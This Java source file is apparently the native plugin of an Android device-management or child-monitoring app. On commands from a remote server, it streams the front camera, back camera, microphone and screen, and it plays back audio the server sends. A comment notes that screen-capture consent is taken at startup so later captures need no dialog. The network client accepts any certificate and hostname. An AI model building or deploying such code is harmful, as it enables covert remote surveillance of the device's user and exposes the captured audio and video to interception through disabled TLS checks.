package com.mdmagent.app;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.webkit.WebView;

import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

@CapacitorPlugin(name = "NativeSocket")
public class NativeSocketPlugin extends Plugin {

    // Static instance so MainActivity can pass MediaProjection back to us
    static NativeSocketPlugin instance = null;

    @Override
    public void load() {
        super.load();
        instance = this;
    }

    // ── WebSocket ─────────────────────────────────────────────────────
    private OkHttpClient httpClient;
    private WebSocket ws;
    private String savedUrl;
    private String savedDeviceId;
    private boolean shouldReconnect = false;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    // ── Front camera ──────────────────────────────────────────────────
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private boolean cameraActive = false;
    private long lastFrameMs = 0;
    private boolean pendingScreenshot = false;

    // ── Back camera ───────────────────────────────────────────────────
    private HandlerThread cameraThreadBack;
    private Handler cameraHandlerBack;
    private CameraDevice cameraDeviceBack;
    private CameraCaptureSession captureSessionBack;
    private ImageReader imageReaderBack;
    private boolean cameraActiveBack = false;
    private long lastFrameMsBack = 0;

    // ── Screen capture ────────────────────────────────────────────────
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader screenImageReader;
    private HandlerThread screenThread;
    private Handler screenHandler;
    private boolean screenActive = false;
    private long lastScreenFrameMs = 0;
    private boolean pendingScreenStart = false;  // set when cmd:screen:start arrives before projection is ready

    // ── Mic ───────────────────────────────────────────────────────────
    private AudioRecord audioRecord;
    private volatile boolean micActive = false;
    private Thread micThread;

    // ── Live speaker (AudioTrack stream) ─────────────────────────────
    private AudioTrack audioTrack;
    private volatile boolean liveSpeakActive = false;

    // ── One-shot MediaPlayer speaker ─────────────────────────────────
    private MediaPlayer mediaPlayer;

    // ── Fire event into WebView ───────────────────────────────────────
    private void fireJs(String event, String jsonPayload) {
        String payload = (jsonPayload != null) ? jsonPayload : "null";
        String js = "window.dispatchEvent(new CustomEvent('nativesocket',{detail:{event:'"
                + event.replace("'", "\\'") + "',payload:" + payload + "}}))";
        mainHandler.post(() -> {
            WebView wv = getBridge().getWebView();
            if (wv != null) wv.evaluateJavascript(js, null);
        });
    }

    // ── OkHttpClient (trust-all SSL) ──────────────────────────────────
    private OkHttpClient buildClient() {
        try {
            X509TrustManager trust = new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{trust}, new java.security.SecureRandom());
            return new OkHttpClient.Builder()
                    .sslSocketFactory(sc.getSocketFactory(), trust)
                    .hostnameVerifier((h, s) -> true)
                    .pingInterval(20, TimeUnit.SECONDS)
                    .connectTimeout(15, TimeUnit.SECONDS)
                    .readTimeout(0, TimeUnit.SECONDS)
                    .build();
        } catch (Exception e) { return new OkHttpClient(); }
    }

    // ── Connect ───────────────────────────────────────────────────────
    @PluginMethod
    public void connect(PluginCall call) {
        savedUrl = call.getString("url");
        savedDeviceId = call.getString("deviceId");
        shouldReconnect = true;
        if (httpClient == null) httpClient = buildClient();
        doConnect();
        call.resolve();
    }

    private void doConnect() {
        if (ws != null) { ws.cancel(); ws = null; }
        String wsUrl = savedUrl
                .replace("https://", "wss://").replace("http://", "ws://")
                + "/socket.io/?EIO=4&transport=websocket&role=child&deviceId=" + savedDeviceId;

        ws = httpClient.newWebSocket(new Request.Builder().url(wsUrl).build(), new WebSocketListener() {
            @Override public void onOpen(WebSocket s, Response r) {
                s.send("40"); // socket.io namespace join
            }

            @Override public void onMessage(WebSocket s, String text) {
                if (text.startsWith("0")) {
                    // engine.io open packet — "40" already sent in onOpen
                } else if (text.startsWith("40")) {
                    fireJs("connect", null);
                } else if (text.equals("2")) {
                    s.send("3"); // pong
                } else if (text.startsWith("42")) {
                    handleServerEvent(text.substring(2));
                }
            }

            @Override public void onFailure(WebSocket s, Throwable t, Response r) {
                fireJs("connect_error", "\"" + (t != null ? t.getMessage() : "failed") + "\"");
                scheduleReconnect();
            }

            @Override public void onClosed(WebSocket s, int code, String reason) {
                fireJs("disconnect", null);
                scheduleReconnect();
            }
        });
    }

    private void handleServerEvent(String payload) {
        try {
            JSONArray arr = new JSONArray(payload);
            String evt = arr.getString(0);
            String data = arr.length() > 1 ? arr.get(1).toString() : "null";

            switch (evt) {
                case "cmd:camera:start":
                case "cmd:camera:start:front":
                    startCameraFront(); fireJs(evt, null); break;
                case "cmd:camera:stop":
                case "cmd:camera:stop:front":
                    stopCameraFront(); fireJs(evt, null); break;
                case "cmd:camera:start:back":
                    startCameraBack(); fireJs("cmd:camera:start:back", null); break;
                case "cmd:camera:stop:back":
                    stopCameraBack(); fireJs("cmd:camera:stop:back", null); break;

                case "cmd:mic:on":
                    startMicNative(); fireJs("cmd:mic:on", null); break;
                case "cmd:mic:off":
                    stopMicNative(); fireJs("cmd:mic:off", null); break;

                // Screen capture — handled fully in native Java
                case "cmd:screen:start":
                    if (mediaProjection != null) {
                        // Permission already granted at startup — start directly, no dialog
                        startVirtualDisplay();
                        fireJs("screen:started", null);
                    } else {
                        // Need to ask for permission first
                        pendingScreenStart = true;
                        mainHandler.post(() -> {
                            if (getActivity() instanceof MainActivity)
                                ((MainActivity) getActivity()).launchScreenCapture();
                        });
                    }
                    break;
                case "cmd:screen:stop":
                    stopVirtualDisplay(); fireJs("cmd:screen:stop", null); break;

                // Live speaker — handled fully in native Java
                case "cmd:speak:live:start":
                    startLiveSpeakNative(); fireJs("cmd:speak:live:start", null); break;
                case "cmd:speak:live:stop":
                    stopLiveSpeakNative(); fireJs("cmd:speak:live:stop", null); break;
                case "speak:live:chunk":
                    writeLiveAudioChunk(data); break;

                // One-shot audio playback (existing)
                case "cmd:speak":
                    try {
                        String audioData = new JSONObject(data).getString("audioData");
                        playAudioNative(audioData);
                    } catch (Exception ignored) {}
                    fireJs("cmd:speak", null); break;

                case "cmd:screenshot":
                    if (cameraActive) pendingScreenshot = true;
                    else takeScreenshotNative();
                    break;

                default:
                    fireJs(evt, data.equals("null") ? null : data); break;
            }
        } catch (Exception ignored) {}
    }

    private void scheduleReconnect() {
        if (!shouldReconnect) return;
        mainHandler.postDelayed(() -> { if (shouldReconnect) doConnect(); }, 3000);
    }

    // ── Send to server ────────────────────────────────────────────────
    private void sendEvent(String event, JSONObject data) {
        if (ws == null) return;
        try {
            JSONArray arr = new JSONArray();
            arr.put(event);
            if (data != null) arr.put(data);
            ws.send("42" + arr.toString());
        } catch (Exception ignored) {}
    }

    @PluginMethod
    public void socketEmit(PluginCall call) {
        String event = call.getString("event");
        String json = call.getString("data", "{}");
        if (ws == null) { call.reject("not connected"); return; }
        try {
            JSONArray arr = new JSONArray();
            arr.put(event);
            arr.put(new JSONObject(json));
            ws.send("42" + arr.toString());
            call.resolve();
        } catch (Exception e) { call.reject(e.getMessage()); }
    }

    @PluginMethod
    public void socketDisconnect(PluginCall call) {
        shouldReconnect = false;
        stopCameraFront(); stopCameraBack();
        stopScreenCapture();
        stopMicNative(); stopLiveSpeakNative();
        if (ws != null) { ws.cancel(); ws = null; }
        call.resolve();
    }

    // ── Screen capture — called from JS, result comes via MainActivity ──
    @PluginMethod
    public void requestScreenCapture(PluginCall call) {
        mainHandler.post(() -> ((MainActivity) getActivity()).launchScreenCapture());
        call.resolve();
    }

    // Called by MainActivity after user approves screen capture dialog
    static void onScreenCaptureApproved(android.media.projection.MediaProjection projection) {
        if (instance == null) return;
        instance.mediaProjection = projection;
        // Must update foreground service type within 10s of obtaining the projection
        if (MdmForegroundService.instance != null)
            MdmForegroundService.instance.updateForegroundType(true);

        if (instance.pendingScreenStart) {
            // Dashboard already requested — start immediately
            instance.pendingScreenStart = false;
            instance.startVirtualDisplay();
            instance.fireJs("screen:started", null);
        }
        // else: permission was pre-granted at startup, wait for cmd:screen:start
    }

    static void onScreenCaptureDenied() {
        if (instance != null) {
            instance.pendingScreenStart = false;
            instance.fireJs("screen:denied", null);
        }
    }

    private void startVirtualDisplay() {
        if (screenActive || mediaProjection == null) return;
        screenActive = true;

        DisplayMetrics metrics = getContext().getResources().getDisplayMetrics();
        int width  = metrics.widthPixels  / 2;
        int height = metrics.heightPixels / 2;
        int dpi    = metrics.densityDpi   / 2;

        screenThread = new HandlerThread("MdmScreen");
        screenThread.start();
        screenHandler = new Handler(screenThread.getLooper());

        screenImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        screenImageReader.setOnImageAvailableListener(reader -> {
            Image img = reader.acquireLatestImage();
            if (img == null) return;
            long now = System.currentTimeMillis();
            if (now - lastScreenFrameMs < 250) { img.close(); return; } // 4 fps
            lastScreenFrameMs = now;
            try {
                Image.Plane plane = img.getPlanes()[0];
                ByteBuffer buf = plane.getBuffer();
                int ps = plane.getPixelStride();
                int rs = plane.getRowStride();
                int paddedW = rs / ps;

                Bitmap bmp = Bitmap.createBitmap(paddedW, height, Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(buf);
                if (paddedW != width) {
                    Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
                    bmp.recycle();
                    bmp = cropped;
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 55, baos);
                bmp.recycle();

                String b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("frame", b64);
                sendEvent("screen:frame", d);
            } catch (Exception ignored) {
            } finally { img.close(); }
        }, screenHandler);

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "MdmScreen", width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            screenImageReader.getSurface(), null, screenHandler
        );
    }

    // Stops only the VirtualDisplay — keeps MediaProjection alive so next start needs no dialog
    private void stopVirtualDisplay() {
        screenActive = false;
        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
        try { if (screenImageReader != null) { screenImageReader.close(); screenImageReader = null; } } catch (Exception ignored) {}
        if (screenThread != null) { screenThread.quitSafely(); screenThread = null; }
    }

    // Full teardown — releases the MediaProjection too (called on disconnect)
    private void stopScreenCapture() {
        stopVirtualDisplay();
        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
        if (MdmForegroundService.instance != null)
            MdmForegroundService.instance.updateForegroundType(false);
    }

    // ── Front Camera2 ─────────────────────────────────────────────────
    private void startCameraFront() {
        if (cameraActive) return;
        cameraActive = true;

        cameraThread = new HandlerThread("MdmCamera");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager mgr = (CameraManager) getContext().getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) { camId = id; break; }
            }
            if (camId == null && mgr.getCameraIdList().length > 0) camId = mgr.getCameraIdList()[0];
            if (camId == null) { cameraActive = false; return; }

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                boolean isShot = pendingScreenshot;
                if (!isShot && now - lastFrameMs < 250) { img.close(); return; }
                lastFrameMs = now;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject d = new JSONObject();
                    d.put("frame", b64); d.put("cameraType", "front");
                    sendEvent("camera:frame", d);
                    if (isShot) { pendingScreenshot = false; sendEvent("screenshot:data", d); }
                } catch (Exception ignored) {
                } finally { img.close(); }
            }, cameraHandler);

            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                        req.addTarget(imageReader.getSurface());
                                        session.setRepeatingRequest(req.build(), null, cameraHandler);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
                            }, cameraHandler);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; }
            }, cameraHandler);
        } catch (Exception e) { cameraActive = false; }
    }

    private void stopCameraFront() {
        cameraActive = false;
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice != null) { cameraDevice.close(); cameraDevice = null; } } catch (Exception ignored) {}
        try { if (imageReader != null) { imageReader.close(); imageReader = null; } } catch (Exception ignored) {}
        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; }
    }

    // ── Back Camera2 ──────────────────────────────────────────────────
    private void startCameraBack() {
        if (cameraActiveBack) return;
        cameraActiveBack = true;

        cameraThreadBack = new HandlerThread("MdmCameraBack");
        cameraThreadBack.start();
        cameraHandlerBack = new Handler(cameraThreadBack.getLooper());

        try {
            CameraManager mgr = (CameraManager) getContext().getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) { camId = id; break; }
            }
            if (camId == null) { cameraActiveBack = false; return; }

            imageReaderBack = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReaderBack.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                if (now - lastFrameMsBack < 250) { img.close(); return; }
                lastFrameMsBack = now;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject d = new JSONObject();
                    d.put("frame", b64); d.put("cameraType", "back");
                    sendEvent("camera:frame", d);
                } catch (Exception ignored) {
                } finally { img.close(); }
            }, cameraHandlerBack);

            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDeviceBack = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReaderBack.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSessionBack = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                        req.addTarget(imageReaderBack.getSurface());
                                        session.setRepeatingRequest(req.build(), null, cameraHandlerBack);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {}
                            }, cameraHandlerBack);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActiveBack = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActiveBack = false; }
            }, cameraHandlerBack);
        } catch (Exception e) { cameraActiveBack = false; }
    }

    private void stopCameraBack() {
        cameraActiveBack = false;
        try { if (captureSessionBack != null) { captureSessionBack.close(); captureSessionBack = null; } } catch (Exception ignored) {}
        try { if (cameraDeviceBack != null) { cameraDeviceBack.close(); cameraDeviceBack = null; } } catch (Exception ignored) {}
        try { if (imageReaderBack != null) { imageReaderBack.close(); imageReaderBack = null; } } catch (Exception ignored) {}
        if (cameraThreadBack != null) { cameraThreadBack.quitSafely(); cameraThreadBack = null; }
    }

    // ── One-shot screenshot ───────────────────────────────────────────
    private void takeScreenshotNative() {
        cameraActive = true;
        pendingScreenshot = true;
        cameraThread = new HandlerThread("MdmScreenshot");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        try {
            CameraManager mgr = (CameraManager) getContext().getSystemService(Context.CAMERA_SERVICE);
            String camId = mgr.getCameraIdList().length > 0 ? mgr.getCameraIdList()[0] : null;
            if (camId == null) { cameraActive = false; pendingScreenshot = false; return; }

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject d = new JSONObject(); d.put("frame", b64);
                    sendEvent("screenshot:data", d);
                } catch (Exception ignored) {
                } finally { img.close(); stopCameraFront(); }
            }, cameraHandler);

            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        req.addTarget(imageReader.getSurface());
                                        session.capture(req.build(), null, cameraHandler);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraFront(); }
                            }, cameraHandler);
                    } catch (Exception ignored) { stopCameraFront(); }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; }
            }, cameraHandler);
        } catch (Exception e) { cameraActive = false; pendingScreenshot = false; }
    }

    // ── AudioRecord Mic ───────────────────────────────────────────────
    private void startMicNative() {
        if (micActive) return;
        micActive = true;

        int sampleRate = 16000;
        int bufSize = Math.max(
            AudioRecord.getMinBufferSize(sampleRate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT),
            3200
        );
        audioRecord = new AudioRecord(
            MediaRecorder.AudioSource.MIC, sampleRate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize * 4
        );
        audioRecord.startRecording();

        try {
            JSONObject s = new JSONObject(); s.put("active", true);
            sendEvent("mic:state", s);
        } catch (Exception ignored) {}

        micThread = new Thread(() -> {
            byte[] buf = new byte[bufSize];
            while (micActive) {
                int n = audioRecord.read(buf, 0, bufSize);
                if (n > 0 && ws != null) {
                    try {
                        String b64 = Base64.encodeToString(Arrays.copyOf(buf, n), Base64.NO_WRAP);
                        JSONObject d = new JSONObject();
                        d.put("chunk", b64); d.put("format", "pcm16"); d.put("sampleRate", sampleRate);
                        sendEvent("mic:audio", d);
                    } catch (Exception ignored) {}
                }
            }
        });
        micThread.setDaemon(true);
        micThread.start();
    }

    private void stopMicNative() {
        micActive = false;
        if (audioRecord != null) {
            try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
            audioRecord = null;
        }
        try { JSONObject d = new JSONObject(); d.put("active", false); sendEvent("mic:state", d); }
        catch (Exception ignored) {}
    }

    // ── Live Speaker — AudioTrack streaming ───────────────────────────
    private void startLiveSpeakNative() {
        if (liveSpeakActive) return;
        liveSpeakActive = true;
        int sr = 16000;
        int minBuf = AudioTrack.getMinBufferSize(sr, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
        try {
            audioTrack = new AudioTrack.Builder()
                .setAudioAttributes(new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build())
                .setAudioFormat(new AudioFormat.Builder()
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .setSampleRate(sr)
                    .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                    .build())
                .setBufferSizeInBytes(minBuf * 4)
                .setTransferMode(AudioTrack.MODE_STREAM)
                .build();
            audioTrack.play();
        } catch (Exception e) { liveSpeakActive = false; }
    }

    private void stopLiveSpeakNative() {
        liveSpeakActive = false;
        if (audioTrack != null) {
            try { audioTrack.stop(); audioTrack.release(); } catch (Exception ignored) {}
            audioTrack = null;
        }
    }

    private void writeLiveAudioChunk(String jsonData) {
        if (!liveSpeakActive || audioTrack == null) return;
        try {
            JSONObject obj = new JSONObject(jsonData);
            byte[] pcm = Base64.decode(obj.getString("chunk"), Base64.DEFAULT);
            audioTrack.write(pcm, 0, pcm.length);
        } catch (Exception ignored) {}
    }

    // ── One-shot MediaPlayer speaker ──────────────────────────────────
    private void playAudioNative(String base64Data) {
        try {
            byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
            File tmp = File.createTempFile("spk_", ".webm", getContext().getCacheDir());
            try (FileOutputStream fos = new FileOutputStream(tmp)) { fos.write(data); }

            mainHandler.post(() -> {
                try {
                    if (mediaPlayer != null) { mediaPlayer.release(); mediaPlayer = null; }
                    mediaPlayer = new MediaPlayer();
                    mediaPlayer.setDataSource(tmp.getAbsolutePath());
                    mediaPlayer.setOnCompletionListener(mp -> {
                        mp.release(); mediaPlayer = null; tmp.delete();
                        fireJs("speak:done", null);
                    });
                    mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                        mp.release(); mediaPlayer = null; tmp.delete(); return true;
                    });
                    mediaPlayer.prepare();
                    mediaPlayer.start();
                } catch (Exception e) { tmp.delete(); }
            });
        } catch (Exception ignored) {}
    }
}
